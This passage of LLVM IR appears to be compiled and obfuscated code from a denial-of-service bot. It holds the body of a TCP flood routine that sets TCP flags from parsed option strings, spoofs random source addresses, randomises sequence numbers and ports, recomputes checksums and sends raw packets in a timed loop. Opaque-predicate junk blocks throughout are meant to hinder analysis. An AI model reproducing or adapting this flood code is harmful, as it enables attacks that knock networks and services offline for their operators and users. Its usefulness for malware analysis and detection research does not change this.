  %357 = icmp ne i32 %356, 0
  %358 = load i32, i32* @x.75
  %359 = load i32, i32* @y.76
  %360 = sub i32 %358, 1
  %361 = mul i32 %358, %360
  %362 = urem i32 %361, 2
  %363 = icmp eq i32 %362, 0
  %364 = icmp slt i32 %359, 10
  %365 = or i1 %363, %364
  br i1 %365, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br i1 %357, label %374, label %366

; <label>:366:                                    ; preds = %originalBBpart2136
  %367 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 0
  %369 = bitcast %union.anon* %368 to %struct.anon.0*
  %370 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %369, i32 0, i32 4
  %371 = load i16, i16* %370, align 4
  %372 = and i16 %371, -513
  %373 = or i16 %372, 512
  store i16 %373, i16* %370, align 4
  br label %536

; <label>:374:                                    ; preds = %originalBBpart2136
  %375 = load i8*, i8** %23, align 8
  %376 = call i32 @strcmp(i8* %375, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.157, i32 0, i32 0)) #9
  %377 = icmp ne i32 %376, 0
  br i1 %377, label %402, label %378

; <label>:378:                                    ; preds = %374
  %379 = load i32, i32* @x.75
  %380 = load i32, i32* @y.76
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %378
  %387 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 0
  %389 = bitcast %union.anon* %388 to %struct.anon.0*
  %390 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %389, i32 0, i32 4
  %391 = load i16, i16* %390, align 4
  %392 = and i16 %391, -1025
  %393 = or i16 %392, 1024
  store i16 %393, i16* %390, align 4
  %394 = load i32, i32* @x.75
  %395 = load i32, i32* @y.76
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart2149, label %originalBB138alteredBB

originalBBpart2149:                               ; preds = %originalBB138
  br label %519

; <label>:402:                                    ; preds = %374
  %403 = load i8*, i8** %23, align 8
  %404 = call i32 @strcmp(i8* %403, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.158, i32 0, i32 0)) #9
  %405 = icmp ne i32 %404, 0
  br i1 %405, label %430, label %406

; <label>:406:                                    ; preds = %402
  %407 = load i32, i32* @x.75
  %408 = load i32, i32* @y.76
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBB151, label %originalBB151alteredBB

originalBB151:                                    ; preds = %originalBB151alteredBB, %406
  %415 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 0
  %417 = bitcast %union.anon* %416 to %struct.anon.0*
  %418 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %417, i32 0, i32 4
  %419 = load i16, i16* %418, align 4
  %420 = and i16 %419, -257
  %421 = or i16 %420, 256
  store i16 %421, i16* %418, align 4
  %422 = load i32, i32* @x.75
  %423 = load i32, i32* @y.76
  %424 = sub i32 %422, 1
  %425 = mul i32 %422, %424
  %426 = urem i32 %425, 2
  %427 = icmp eq i32 %426, 0
  %428 = icmp slt i32 %423, 10
  %429 = or i1 %427, %428
  br i1 %429, label %originalBBpart2166, label %originalBB151alteredBB

originalBBpart2166:                               ; preds = %originalBB151
  br label %502

; <label>:430:                                    ; preds = %402
  %431 = load i32, i32* @x.75
  %432 = load i32, i32* @y.76
  %433 = sub i32 %431, 1
  %434 = mul i32 %431, %433
  %435 = urem i32 %434, 2
  %436 = icmp eq i32 %435, 0
  %437 = icmp slt i32 %432, 10
  %438 = or i1 %436, %437
  br i1 %438, label %originalBB168, label %originalBB168alteredBB

originalBB168:                                    ; preds = %originalBB168alteredBB, %430
  %439 = load i8*, i8** %23, align 8
  %440 = call i32 @strcmp(i8* %439, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.159, i32 0, i32 0)) #9
  %441 = icmp ne i32 %440, 0
  %442 = load i32, i32* @x.75
  %443 = load i32, i32* @y.76
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart2170, label %originalBB168alteredBB

originalBBpart2170:                               ; preds = %originalBB168
  br i1 %441, label %458, label %450

; <label>:450:                                    ; preds = %originalBBpart2170
  %451 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  %453 = bitcast %union.anon* %452 to %struct.anon.0*
  %454 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %453, i32 0, i32 4
  %455 = load i16, i16* %454, align 4
  %456 = and i16 %455, -4097
  %457 = or i16 %456, 4096
  store i16 %457, i16* %454, align 4
  br label %485

; <label>:458:                                    ; preds = %originalBBpart2170
  %459 = load i8*, i8** %23, align 8
  %460 = call i32 @strcmp(i8* %459, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.160, i32 0, i32 0)) #9
  %461 = icmp ne i32 %460, 0
  br i1 %461, label %470, label %462

; <label>:462:                                    ; preds = %458
  %463 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %464 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %463, i32 0, i32 0
  %465 = bitcast %union.anon* %464 to %struct.anon.0*
  %466 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %465, i32 0, i32 4
  %467 = load i16, i16* %466, align 4
  %468 = and i16 %467, -2049
  %469 = or i16 %468, 2048
  store i16 %469, i16* %466, align 4
  br label %484

; <label>:470:                                    ; preds = %458
  %471 = load i8*, i8** %23, align 8
  %472 = call i32 @strcmp(i8* %471, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.161, i32 0, i32 0)) #9
  %473 = icmp ne i32 %472, 0
  br i1 %473, label %482, label %474

; <label>:474:                                    ; preds = %470
  %475 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %476 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %475, i32 0, i32 0
  %477 = bitcast %union.anon* %476 to %struct.anon.0*
  %478 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %477, i32 0, i32 4
  %479 = load i16, i16* %478, align 4
  %480 = and i16 %479, -8193
  %481 = or i16 %480, 8192
  store i16 %481, i16* %478, align 4
  br label %483

; <label>:482:                                    ; preds = %470
  br label %483

; <label>:483:                                    ; preds = %482, %474
  br label %484

; <label>:484:                                    ; preds = %483, %462
  br label %485

; <label>:485:                                    ; preds = %484, %450
  %486 = load i32, i32* @x.75
  %487 = load i32, i32* @y.76
  %488 = sub i32 %486, 1
  %489 = mul i32 %486, %488
  %490 = urem i32 %489, 2
  %491 = icmp eq i32 %490, 0
  %492 = icmp slt i32 %487, 10
  %493 = or i1 %491, %492
  br i1 %493, label %originalBB172, label %originalBB172alteredBB

originalBB172:                                    ; preds = %originalBB172alteredBB, %485
  %494 = load i32, i32* @x.75
  %495 = load i32, i32* @y.76
  %496 = sub i32 %494, 1
  %497 = mul i32 %494, %496
  %498 = urem i32 %497, 2
  %499 = icmp eq i32 %498, 0
  %500 = icmp slt i32 %495, 10
  %501 = or i1 %499, %500
  br i1 %501, label %originalBBpart2174, label %originalBB172alteredBB

originalBBpart2174:                               ; preds = %originalBB172
  br label %502

; <label>:502:                                    ; preds = %originalBBpart2174, %originalBBpart2166
  %503 = load i32, i32* @x.75
  %504 = load i32, i32* @y.76
  %505 = sub i32 %503, 1
  %506 = mul i32 %503, %505
  %507 = urem i32 %506, 2
  %508 = icmp eq i32 %507, 0
  %509 = icmp slt i32 %504, 10
  %510 = or i1 %508, %509
  br i1 %510, label %originalBB176, label %originalBB176alteredBB

originalBB176:                                    ; preds = %originalBB176alteredBB, %502
  %511 = load i32, i32* @x.75
  %512 = load i32, i32* @y.76
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBBpart2178, label %originalBB176alteredBB

originalBBpart2178:                               ; preds = %originalBB176
  br label %519

; <label>:519:                                    ; preds = %originalBBpart2178, %originalBBpart2149
  %520 = load i32, i32* @x.75
  %521 = load i32, i32* @y.76
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBB180, label %originalBB180alteredBB

originalBB180:                                    ; preds = %originalBB180alteredBB, %519
  %528 = load i32, i32* @x.75
  %529 = load i32, i32* @y.76
  %530 = sub i32 %528, 1
  %531 = mul i32 %528, %530
  %532 = urem i32 %531, 2
  %533 = icmp eq i32 %532, 0
  %534 = icmp slt i32 %529, 10
  %535 = or i1 %533, %534
  br i1 %535, label %originalBBpart2182, label %originalBB180alteredBB

originalBBpart2182:                               ; preds = %originalBB180
  br label %536

; <label>:536:                                    ; preds = %originalBBpart2182, %366
  %537 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0)) #5
  store i8* %537, i8** %23, align 8
  br label %327

; <label>:538:                                    ; preds = %originalBBpart2132
  %539 = load i32, i32* @x.75
  %540 = load i32, i32* @y.76
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBB184, label %originalBB184alteredBB

originalBB184:                                    ; preds = %originalBB184alteredBB, %538
  %547 = load i32, i32* @x.75
  %548 = load i32, i32* @y.76
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBBpart2186, label %originalBB184alteredBB

originalBBpart2186:                               ; preds = %originalBB184
  br label %555

; <label>:555:                                    ; preds = %originalBBpart2186, %309
  %556 = call i32 @rand_cmwc()
  %557 = trunc i32 %556 to i16
  %558 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %559 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %558, i32 0, i32 0
  %560 = bitcast %union.anon* %559 to %struct.anon.0*
  %561 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %560, i32 0, i32 5
  store i16 %557, i16* %561, align 2
  %562 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 0
  %564 = bitcast %union.anon* %563 to %struct.anon.0*
  %565 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %564, i32 0, i32 6
  store i16 0, i16* %565, align 4
  %566 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %567 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %566, i32 0, i32 0
  %568 = bitcast %union.anon* %567 to %struct.anon.0*
  %569 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %568, i32 0, i32 7
  store i16 0, i16* %569, align 2
  %570 = load i32, i32* %9, align 4
  %571 = icmp eq i32 %570, 0
  br i1 %571, label %572, label %574

; <label>:572:                                    ; preds = %555
  %573 = call i32 @rand_cmwc()
  br label %579

; <label>:574:                                    ; preds = %555
  %575 = load i32, i32* %9, align 4
  %576 = trunc i32 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #10
  %578 = zext i16 %577 to i32
  br label %579

; <label>:579:                                    ; preds = %574, %572
  %580 = phi i32 [ %573, %572 ], [ %578, %574 ]
  %581 = trunc i32 %580 to i16
  %582 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %583 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %582, i32 0, i32 0
  %584 = bitcast %union.anon* %583 to %struct.anon.0*
  %585 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %584, i32 0, i32 1
  store i16 %581, i16* %585, align 2
  %586 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %587 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %588 = call zeroext i16 @tcpcsum(%struct.iphdr* %586, %struct.tcphdr* %587)
  %589 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 0
  %591 = bitcast %union.anon* %590 to %struct.anon.0*
  %592 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %591, i32 0, i32 6
  store i16 %588, i16* %592, align 4
  %593 = bitcast i8* %169 to i16*
  %594 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %595 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %594, i32 0, i32 2
  %596 = load i16, i16* %595, align 2
  %597 = zext i16 %596 to i32
  %598 = call zeroext i16 @csum(i16* %593, i32 %597)
  %599 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %600 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %599, i32 0, i32 7
  store i16 %598, i16* %600, align 2
  %601 = call i64 @time(i64* null) #5
  %602 = load i32, i32* %10, align 4
  %603 = sext i32 %602 to i64
  %604 = add nsw i64 %601, %603
  %605 = trunc i64 %604 to i32
  store i32 %605, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %606

; <label>:606:                                    ; preds = %originalBBpart2207, %675, %579
  br label %607

; <label>:607:                                    ; preds = %606
  %608 = load i32, i32* @x.75
  %609 = load i32, i32* @y.76
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBB188, label %originalBB188alteredBB

originalBB188:                                    ; preds = %originalBB188alteredBB, %607
  %616 = load i32, i32* %17, align 4
  %617 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %618 = call i64 @sendto(i32 %616, i8* %169, i64 %167, i32 0, %struct.sockaddr* %617, i32 16)
  %619 = load i32, i32* %19, align 4
  %620 = call i32 @getRandomIP(i32 %619)
  %621 = call i32 @htonl(i32 %620) #10
  %622 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %623 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %622, i32 0, i32 8
  store i32 %621, i32* %623, align 4
  %624 = call i32 @rand_cmwc()
  %625 = trunc i32 %624 to i16
  %626 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %627 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %626, i32 0, i32 3
  store i16 %625, i16* %627, align 4
  %628 = call i32 @rand_cmwc()
  %629 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %630 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %629, i32 0, i32 0
  %631 = bitcast %union.anon* %630 to %struct.anon.0*
  %632 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %631, i32 0, i32 2
  store i32 %628, i32* %632, align 4
  %633 = call i32 @rand_cmwc()
  %634 = trunc i32 %633 to i16
  %635 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %636 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %635, i32 0, i32 0
  %637 = bitcast %union.anon* %636 to %struct.anon.0*
  %638 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %637, i32 0, i32 0
  store i16 %634, i16* %638, align 4
  %639 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %640 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %639, i32 0, i32 0
  %641 = bitcast %union.anon* %640 to %struct.anon.0*
  %642 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %641, i32 0, i32 6
  store i16 0, i16* %642, align 4
  %643 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %644 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %645 = call zeroext i16 @tcpcsum(%struct.iphdr* %643, %struct.tcphdr* %644)
  %646 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %647 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %646, i32 0, i32 0
  %648 = bitcast %union.anon* %647 to %struct.anon.0*
  %649 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %648, i32 0, i32 6
  store i16 %645, i16* %649, align 4
  %650 = bitcast i8* %169 to i16*
  %651 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %652 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %651, i32 0, i32 2
  %653 = load i16, i16* %652, align 2
  %654 = zext i16 %653 to i32
  %655 = call zeroext i16 @csum(i16* %650, i32 %654)
  %656 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %657 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %656, i32 0, i32 7
  store i16 %655, i16* %657, align 2
  %658 = load i32, i32* %25, align 4
  %659 = load i32, i32* %15, align 4
  %660 = icmp eq i32 %658, %659
  %661 = load i32, i32* @x.75
  %662 = load i32, i32* @y.76
  %663 = sub i32 %661, 1
  %664 = mul i32 %661, %663
  %665 = urem i32 %664, 2
  %666 = icmp eq i32 %665, 0
  %667 = icmp slt i32 %662, 10
  %668 = or i1 %666, %667
  br i1 %668, label %originalBBpart2190, label %originalBB188alteredBB

originalBBpart2190:                               ; preds = %originalBB188
  br i1 %660, label %669, label %676

; <label>:669:                                    ; preds = %originalBBpart2190
  %670 = call i64 @time(i64* null) #5
  %671 = load i32, i32* %24, align 4
  %672 = sext i32 %671 to i64
  %673 = icmp sgt i64 %670, %672
  br i1 %673, label %674, label %675

; <label>:674:                                    ; preds = %669
  br label %695

; <label>:675:                                    ; preds = %669
  store i32 0, i32* %25, align 4
  br label %606

; <label>:676:                                    ; preds = %originalBBpart2190
  %677 = load i32, i32* @x.75
  %678 = load i32, i32* @y.76
  %679 = sub i32 %677, 1
  %680 = mul i32 %677, %679
  %681 = urem i32 %680, 2
  %682 = icmp eq i32 %681, 0
  %683 = icmp slt i32 %678, 10
  %684 = or i1 %682, %683
  br i1 %684, label %originalBB192, label %originalBB192alteredBB

originalBB192:                                    ; preds = %originalBB192alteredBB, %676
  %685 = load i32, i32* %25, align 4
  %686 = add i32 %685, 1
  store i32 %686, i32* %25, align 4
  %687 = load i32, i32* @x.75
  %688 = load i32, i32* @y.76
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBBpart2207, label %originalBB192alteredBB

originalBBpart2207:                               ; preds = %originalBB192
  br label %606

; <label>:695:                                    ; preds = %674
  %696 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %696)
  br label %697

; <label>:697:                                    ; preds = %695, %originalBBpart212, %83, %76
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  %698 = load i32, i32* %9, align 4
  %699 = trunc i32 %698 to i16
  %700 = call zeroext i16 @htons(i16 zeroext %699) #10
  %701 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %700, i16* %701, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %702 = load i8*, i8** %8, align 8
  %703 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %704 = call i32 @getHost(i8* %702, %struct.in_addr* %703)
  %705 = icmp ne i32 %704, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %84
  store i32 1, i32* %18, align 4
  %706 = load i32, i32* %17, align 4
  %707 = bitcast i32* %18 to i8*
  %708 = call i32 @setsockopt(i32 %706, i32 0, i32 3, i8* %707, i32 4) #5
  %709 = icmp slt i32 %708, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %105
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %125
  store i32 0, i32* %19, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %142
  %710 = load i32, i32* %14, align 4
  %_ = sub i32 32, %710
  %gen = mul i32 %_, %710
  %_19 = sub i32 32, %710
  %gen20 = mul i32 %_19, %710
  %_21 = sub i32 32, %710
  %gen22 = mul i32 %_21, %710
  %_23 = shl i32 32, %710
  %_24 = sub i32 0, 32
  %gen25 = add i32 %_24, %710
  %_26 = sub i32 0, 32
  %gen27 = add i32 %_26, %710
  %_28 = sub i32 0, 32
  %gen29 = add i32 %_28, %710
  %711 = sub nsw i32 32, %710
  %_30 = sub i32 0, 1
  %gen31 = add i32 %_30, %711
  %_32 = sub i32 1, %711
  %gen33 = mul i32 %_32, %711
  %_34 = sub i32 1, %711
  %gen35 = mul i32 %_34, %711
  %_36 = sub i32 0, 1
  %gen37 = add i32 %_36, %711
  %712 = shl i32 1, %711
  %_38 = shl i32 %712, 1
  %_39 = sub i32 %712, 1
  %gen40 = mul i32 %_39, 1
  %_41 = sub i32 0, %712
  %gen42 = add i32 %_41, 1
  %_43 = sub i32 %712, 1
  %gen44 = mul i32 %_43, 1
  %_45 = shl i32 %712, 1
  %_46 = sub i32 0, %712
  %gen47 = add i32 %_46, 1
  %_48 = sub i32 %712, 1
  %gen49 = mul i32 %_48, 1
  %713 = sub nsw i32 %712, 1
  %_50 = sub i32 %713, -1
  %gen51 = mul i32 %_50, -1
  %_52 = sub i32 0, %713
  %gen53 = add i32 %_52, -1
  %714 = xor i32 %713, -1
  store i32 %714, i32* %19, align 4
  br label %originalBB18

originalBB57alteredBB:                            ; preds = %originalBB57, %211
  %715 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %716 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %715, i32 0, i32 0
  %717 = bitcast %union.anon* %716 to %struct.anon.0*
  %718 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %717, i32 0, i32 4
  %719 = load i16, i16* %718, align 4
  %_58 = sub i16 0, %719
  %gen59 = add i16 %_58, -513
  %720 = and i16 %719, -513
  %_60 = sub i16 %720, 512
  %gen61 = mul i16 %_60, 512
  %_62 = shl i16 %720, 512
  %_63 = sub i16 0, %720
  %gen64 = add i16 %_63, 512
  %_65 = shl i16 %720, 512
  %721 = or i16 %720, 512
  store i16 %721, i16* %718, align 4
  %722 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %723 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %722, i32 0, i32 0
  %724 = bitcast %union.anon* %723 to %struct.anon.0*
  %725 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %724, i32 0, i32 4
  %726 = load i16, i16* %725, align 4
  %_66 = shl i16 %726, -1025
  %_67 = sub i16 0, %726
  %gen68 = add i16 %_67, -1025
  %_69 = sub i16 %726, -1025
  %gen70 = mul i16 %_69, -1025
  %_71 = shl i16 %726, -1025
  %727 = and i16 %726, -1025
  %_72 = sub i16 %727, 1024
  %gen73 = mul i16 %_72, 1024
  %_74 = shl i16 %727, 1024
  %_75 = sub i16 0, %727
  %gen76 = add i16 %_75, 1024
  %_77 = sub i16 0, %727
  %gen78 = add i16 %_77, 1024
  %_79 = sub i16 %727, 1024
  %gen80 = mul i16 %_79, 1024
  %_81 = sub i16 %727, 1024
  %gen82 = mul i16 %_81, 1024
  %728 = or i16 %727, 1024
  store i16 %728, i16* %725, align 4
  %729 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %730 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %729, i32 0, i32 0
  %731 = bitcast %union.anon* %730 to %struct.anon.0*
  %732 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %731, i32 0, i32 4
  %733 = load i16, i16* %732, align 4
  %_83 = sub i16 %733, -257
  %gen84 = mul i16 %_83, -257
  %734 = and i16 %733, -257
  %_85 = sub i16 0, %734
  %gen86 = add i16 %_85, 256
  %_87 = sub i16 0, %734
  %gen88 = add i16 %_87, 256
  %_89 = sub i16 0, %734
  %gen90 = add i16 %_89, 256
  %_91 = sub i16 0, %734
  %gen92 = add i16 %_91, 256
  %735 = or i16 %734, 256
  store i16 %735, i16* %732, align 4
  %736 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %737 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %736, i32 0, i32 0
  %738 = bitcast %union.anon* %737 to %struct.anon.0*
  %739 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %738, i32 0, i32 4
  %740 = load i16, i16* %739, align 4
  %741 = and i16 %740, -4097
  %_93 = shl i16 %741, 4096
  %_94 = sub i16 0, %741
  %gen95 = add i16 %_94, 4096
  %_96 = sub i16 %741, 4096
  %gen97 = mul i16 %_96, 4096
  %_98 = shl i16 %741, 4096
  %_99 = sub i16 0, %741
  %gen100 = add i16 %_99, 4096
  %742 = or i16 %741, 4096
  store i16 %742, i16* %739, align 4
  %743 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %744 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %743, i32 0, i32 0
  %745 = bitcast %union.anon* %744 to %struct.anon.0*
  %746 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %745, i32 0, i32 4
  %747 = load i16, i16* %746, align 4
  %_101 = sub i16 %747, -2049
  %gen102 = mul i16 %_101, -2049
  %_103 = sub i16 0, %747
  %gen104 = add i16 %_103, -2049
  %_105 = shl i16 %747, -2049
  %_106 = shl i16 %747, -2049
  %_107 = sub i16 0, %747
  %gen108 = add i16 %_107, -2049
  %_109 = sub i16 0, %747
  %gen110 = add i16 %_109, -2049
  %748 = and i16 %747, -2049
  %_111 = sub i16 %748, 2048
  %gen112 = mul i16 %_111, 2048
  %749 = or i16 %748, 2048
  store i16 %749, i16* %746, align 4
  %750 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %751 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %750, i32 0, i32 0
  %752 = bitcast %union.anon* %751 to %struct.anon.0*
  %753 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %752, i32 0, i32 4
  %754 = load i16, i16* %753, align 4
  %_113 = sub i16 0, %754
  %gen114 = add i16 %_113, -8193
  %755 = and i16 %754, -8193
  %_115 = shl i16 %755, 8192
  %_116 = shl i16 %755, 8192
  %_117 = sub i16 0, %755
  %gen118 = add i16 %_117, 8192
  %_119 = sub i16 %755, 8192
  %gen120 = mul i16 %_119, 8192
  %_121 = sub i16 %755, 8192
  %gen122 = mul i16 %_121, 8192
  %756 = or i16 %755, 8192
  store i16 %756, i16* %753, align 4
  br label %originalBB57

originalBB126alteredBB:                           ; preds = %originalBB126, %270
  %757 = load i8*, i8** %11, align 8
  %758 = call i32 @strcmp(i8* %757, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.153, i32 0, i32 0)) #9
  %759 = icmp ne i32 %758, 0
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %327
  %760 = load i8*, i8** %23, align 8
  %761 = icmp ne i8* %760, null
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %346
  %762 = load i8*, i8** %23, align 8
  %763 = call i32 @strcmp(i8* %762, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.156, i32 0, i32 0)) #9
  %764 = icmp ne i32 %763, 0
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %378
  %765 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %766 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %765, i32 0, i32 0
  %767 = bitcast %union.anon* %766 to %struct.anon.0*
  %768 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %767, i32 0, i32 4
  %769 = load i16, i16* %768, align 4
  %_139 = shl i16 %769, -1025
  %_140 = shl i16 %769, -1025
  %_141 = sub i16 0, %769
  %gen142 = add i16 %_141, -1025
  %770 = and i16 %769, -1025
  %_143 = sub i16 0, %770
  %gen144 = add i16 %_143, 1024
  %_145 = shl i16 %770, 1024
  %_146 = sub i16 %770, 1024
  %gen147 = mul i16 %_146, 1024
  %771 = or i16 %770, 1024
  store i16 %771, i16* %768, align 4
  br label %originalBB138

originalBB151alteredBB:                           ; preds = %originalBB151, %406
  %772 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %773 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %772, i32 0, i32 0
  %774 = bitcast %union.anon* %773 to %struct.anon.0*
  %775 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %774, i32 0, i32 4
  %776 = load i16, i16* %775, align 4
  %_152 = sub i16 0, %776
  %gen153 = add i16 %_152, -257
  %_154 = sub i16 %776, -257
  %gen155 = mul i16 %_154, -257
  %_156 = shl i16 %776, -257
  %_157 = shl i16 %776, -257
  %_158 = sub i16 0, %776
  %gen159 = add i16 %_158, -257
